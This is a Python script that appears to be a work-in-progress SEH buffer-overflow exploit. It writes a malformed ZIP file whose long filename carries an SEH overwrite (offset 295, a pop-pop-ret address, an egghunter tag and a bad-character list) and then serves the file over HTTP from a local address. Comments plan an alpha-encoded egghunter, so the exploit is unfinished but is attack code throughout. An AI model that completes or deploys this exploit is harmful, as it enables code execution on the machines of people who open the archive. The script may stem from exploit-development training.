#!/usr/bin/python3

import struct
import socketserver
import subprocess
import http.server


def create_file(offset):
    # NSEH is at 295
    # SEH is at 299
    # EBP is at 287
    # ESI is at 1323
    # Full filename path begins at EDX
    # bad chars: \x00\x2f\x3a\x5c
    # buf found even though null byte in pop pop ret cuts off string
    # to do: jump back, push esp onto stack, pop insto eax, adjust eax to 
    # beginning of buffer, put alpha encoded egghunter at eax, should work
    buf = b"w00tw00t" 
    max_length = 4064
    seh = struct.pack("<I", 0x00435133)
    nseh = b"\x42\x42\x42\x42"
    #test = offset 
    #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" % test
    #checkstring = subprocess.check_output(cmd, shell=True)
    filename = b"A"* offset + nseh + seh + buf + b"D"*(max_length - offset - 8 - len(buf))
    filename = filename.strip() + b".txt"
    local_file_header = b"\x50\x4b\x03\x04" # Local File signature
    local_file_header += b"\x14\x00" # minimum version needed to extract
    local_file_header += b"\x00\x00" # General purpose bit flag
    local_file_header += b"\x00\x00" # Compression method
    local_file_header += b"\x00\x00" # File last modification time
    local_file_header += b"\x00\x00" # File last modification date
    local_file_header += b"\x00\x00\x00" # CRC-32
    local_file_header += b"\x00\x00\x00\x00" # Compressed size
    local_file_header += b"\x00\x00\x00\x00" # Uncompressed size
    local_file_header += b"\x00\x00" # File name length
    local_file_header += b"\x00\x00\x00" # Extra field length
    local_file_header += filename # File name
    local_file_header += b"" # Extra field

    data = ""
    # data_descriptor is only used when the CRC isn't known when the file is generated
    data_descriptor = b"\x50\x4b\x07\x08" # Optional data descriptor signature
    data_descriptor += b"\x00\x00\x00\x00" # CRC-32
    data_descriptor += b"\x00\x00\x00\x00" # Compressed size
    data_descriptor += b"\x00\x00\x00\x00" # Uncompressed size
    
    central_file_directory_header = b"\x50\x4b\x01\x02" # Central directory file header signature
    central_file_directory_header += b"\x14\x00" # version made by
    central_file_directory_header += b"\x14\x00" # minimum version needed to extract
    central_file_directory_header += b"\x00\x00" # general purpose bit flag
    central_file_directory_header += b"\x00\x00" # Compression method
    central_file_directory_header += b"\x00\x00" # File last modification time
    central_file_directory_header += b"\xce\x00" # File last modification date
    central_file_directory_header += b"\x00\x00\x00\x00" # CRC-32
    central_file_directory_header += b"\x00\x00\x00\x00" # Compressed size
    central_file_directory_header += b"\x00\x00\x00\x00" # Uncompressed size
    central_file_directory_header += b"\x00\x0f" # File name length ** REQUIRED FIELD
    central_file_directory_header += b"\x00\x00" # Extra field length
    central_file_directory_header += b"\x00\x00" # File comment length
    central_file_directory_header += b"\x00\x00" # Disk number where file starts
    central_file_directory_header += b"\x00\x00" # Internal file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # External file attributes
    central_file_directory_header += b"\x00\x00\x00\x00" # Relative offset of local file header
    central_file_directory_header += filename # File name
    central_file_directory_header += b"" # Extra field
    central_file_directory_header += b"" # File comment
    
    # eocd = end of central directory record
    eocd = b"\x50\x4b\x05\x06" # eocd signature
    eocd += b"\x00\x00" # number of this disk
    eocd += b"\x00\x00" # disk where central directory starts
    eocd += b"\x01\x00" # Number of central directory records on this disk
    eocd += b"\x01\x00" # total number of central directory records
    eocd += b"\x12\x10\x00\x00" # Size of central directory
    eocd += b"\x02\x10\x00\x00" # Offset of start of central directory relative to start of archive
    eocd += b"\x00\x00" # Comment length
    eocd += b"" # Comment

    attack = local_file_header + central_file_directory_header + eocd

    file = open("test1.zip", "wb")
    file.write(attack)
    file.close()

def serve_directory():
    port = 8000 
    ip = "192.168.1.244"
    httpServer = socketserver.TCPServer((ip, port), http.server.SimpleHTTPRequestHandler)
    print("[+] Starting HTTP Server on " + ip + " port " + str(port))
    httpServer.serve_forever()

def main():
    offset = 295
    create_file(offset)
    serve_directory()

if __name__ == "__main__":
    main()
